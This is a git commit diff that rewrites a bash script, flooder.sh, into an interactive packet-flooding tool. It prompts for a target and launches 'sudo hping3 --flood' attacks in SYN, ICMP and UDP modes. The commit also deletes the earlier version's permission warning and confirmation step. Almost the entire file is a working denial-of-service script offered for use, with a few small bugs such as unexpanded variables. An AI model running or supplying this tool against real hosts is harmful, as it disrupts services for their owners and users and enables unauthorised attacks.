a0ca811922d9781595a91aa06a76cc6d96d43985
Deemon888 <98923031+Deemon888@users.noreply.github.com>
2022-05-03 18:21:59 -0600

    i updated this
    i updated flooder.sh with my current skill of making bash scripts and style

--- flooder.sh
+++ flooder.sh
@@ -1,29 +1,81 @@
 #!/bin/bash
 
-# NOTE: this is for ethical hacking so do not flood any website without permisson pls and thank you
+autoclear=on
+autoverbose=on
+target=$1
 
-# this is not a advanced script but just a basic. so test out and change if you want 
+# ^^^ vars ^^^ #
 
-echo "enter ip to flood"
-read IP
-
-echo "this is all you need but..."
-sleep 1
-echo "be careful of what you are doing"
-sleep 1
-echo "do you wish to continue (Y or n)"
-read WA
-# WA stands for 'Warning Answer'
-
-# you need hping3 for this attack; run 'sudo apt install hping3'
-
-if [ "$WA" != "${WA#[Yy]}" ]; then
-         echo "running your command now"
-         hping3 -1 --flood $IP
-else
-         echo "exiting"
-         exit
+if [[ $autoclear == "on" ]]; then
+        clear
+fi
+if [[ -z $target ]]; then
+        read -e -p "input target > " target
 fi
 
-# finished in 11 mins
-# 26 lines
+# ^^^ autoclear ^^^
+
+figlet "FLOODER"|lolcat -S 58
+
+# ^^^ into ^^^ #
+
+echo -e "select a mode"
+echo -e "\n Modes vv \n\n        - for default mode\n   1 - icmp (not deadly)\n 2 - upd\n\n Modes ^^ \n\a"
+
+read -e -p "$HOSTNAME ...> " mode
+
+if [[ -z $mode ]]; then
+        echo -e "How do u want your Packets?\n\n        S, syn - syn packets\n   - default\n\a"
+        read -e -p "$HOSTNAME ...> " DMode
+        if [[ -z $DMode ]]; then
+                clear
+                echo -n "FLOODING"|figlet|lolcat -s 55
+                echo -e " $target\n"
+                sudo hping3 -S --flood $target
+        elif [[ $DMode == "S" || $DMode == "syn" ]]; then
+                clear
+                echo -n "FLOODING"|figlet|lolcat -s 55
+                echo -e " $target\n"
+                sudo hping3 -S --flood $target
+        fi
+elif [[ $mode == "1" || $mode == "icmp" ]]; then
+        echo -e "How do u want your Packets?\n\n        S, syn - syn packets\n  A, ack - ack packets\n   - default\n\a"
+        read -e -p "$HOSTNAME ...> " icmpmode
+        if [[ -z icmpmode ]]; then
+                clear
+                echo -n "FLOODING"|figlet|lolcat -s 55
+                echo -e " $target\n"
+                sudo hping3 -1 --flood $target
+        elif [[ $icmpmode == "S" || $icmpmode == "syn" ]]; then
+                clear
+                figlet "FLOODING"|lolcat -s 55
+                echo -e " $target\n"
+                sudo hping3 -1 -S $target
+        elif [[ $icmpmode == "A" || $icmpmode == "ack" ]]; then
+                clear
+                figlet "FLOODING"|lolcat -s 55
+                echo -e " target\n"
+                sudo hping3 -1 -A --flood $target
+        fi
+elif [[ $mode == "2" || $mode == "upd" ]]; then
+        echo -e "How do u want your Packets?\n\n S, syn - syn packets\n  A, ack - ack packets\n   - default\n\a"
+        read -e -p "$HOSTNAME ...> " updmode
+        if [[ -z $updmode ]]; then
+                clear
+                echo -n "FLOODING"|figlet|lolcat -s 55
+                echo -e " target\n"
+                sudo hping3 -2 -S --flood $target
+        elif [[ $updmode == "S" || $updmode == "syn" ]]; then
+                clear
+                figlet "FLOODING"|lolcat -s 55
+                echo -e " target\n"
+                sudo hping3 -2 -S --flood $target
+        elif [[ $updmode == "A" || $updmode == "ack" ]]; then
+                clear
+                figlet "FLOODING"|lolcat -s 55
+                echo -e " target\n"
+                sudo hping3 -2 -A --flood $target
+        fi
+fi
+
+# updated version of flooder #
